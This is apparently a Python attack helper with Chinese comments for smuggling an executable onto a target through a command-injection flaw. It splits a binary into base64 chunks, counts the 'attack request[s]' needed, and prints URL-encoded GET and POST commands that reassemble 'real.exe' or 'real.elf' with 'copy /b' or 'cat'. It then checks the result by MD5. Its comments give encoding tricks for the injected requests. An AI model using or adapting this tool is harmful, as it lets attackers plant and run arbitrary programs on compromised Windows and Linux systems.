import argparse
import base64
import hashlib

# <nul set /p "=Hello">output.txt   无空格写入，记得要bp url编码base64的结果，不然一部分字符依然会出错

def split_into_chunks(data, chunk_size):
    return [data[i:i+chunk_size] for i in range(0, len(data), chunk_size)]

#url会处理+，必须编码一次编码
def get_cmd(num):
    cmd = "copy+/b+"
    for i in range(num):
        cmd = cmd +"c:\\test\\"+ str(i) + ".bin%2B"
    cmd = cmd[:-3] 
    return cmd+"+"+"real.exe"
#cat 1.txt 2.txt > real.elf
def post_linux_cmd(num):
    cmd = "cat+"
    for i in range(num):
        cmd = cmd +"/tmp/"+ str(i) + ".bin+"
    return cmd+">"+"real.elf"

def get_linux_cmd(sum):
    cmd = "cat+"
    for i in range(sum):
        cmd = cmd +"/tmp/"+ str(i) + ".bin%2B"
    return cmd+">"+"real.elf"

#post不处理这些
def post_cmd(num):
    cmd = "copy /b "
    for i in range(num):
        cmd = cmd +"c:\\test\\"+ str(i) + ".bin+"
    cmd = cmd[:-1] 
    return cmd+" "+"real.exe"

def calculate_md5(file_path):
    with open(file_path, 'rb') as file:
        md5_hash = hashlib.md5()
        # 逐块读取文件并更新哈希值
        for chunk in iter(lambda: file.read(4096), b""):
            md5_hash.update(chunk)
        return md5_hash.hexdigest()


def main():
    parser = argparse.ArgumentParser(description="Split a file into chunks of 1000 bits and encode each chunk in base64")
    parser.add_argument("-file", type=str, help="Input file path")
    args = parser.parse_args()
    sum = 0

    if args.file:
        try:
            with open(args.file, 'rb') as file:
                data = file.read()
                chunks = split_into_chunks(data, 1000)
                with open('comeout.txt', 'w') as output_file:
                    for chunk in chunks:
                        sum = sum + 1
                        encoded_chunk = base64.b64encode(chunk).decode('utf-8')
                        output_file.write(encoded_chunk + '\n')
                    print("File has been processed and output saved to comeout.txt")
                    print('now will it execute :\"{}\" for loop and it need {} attack request '.format(sum , sum))
                    print("---------------in get url windows coomand is")
                    this = get_cmd(sum)
                    print(this)
                    print("---------------in post url windows coomand is")
                    this = post_cmd(sum)
                    print(this)
                    print("---------------in post url linux coomand is")
                    this = post_linux_cmd(sum)
                    print(this)
                    print("---------------in get url linux coomand is")
                    this = get_linux_cmd(sum)
                    print(this)


                    print("you nend check the hash about file : ")
                    print("in windows use  certutil -hashfile real.exe md5 and in linux use md5sum real.exe")
                    print("md5 vaule this file must be {}".format(calculate_md5(args.file)))



        except FileNotFoundError:
            print("File not found.")
    else:
        print("Please provide a file using the -file argument.")

if __name__ == "__main__":
    main()
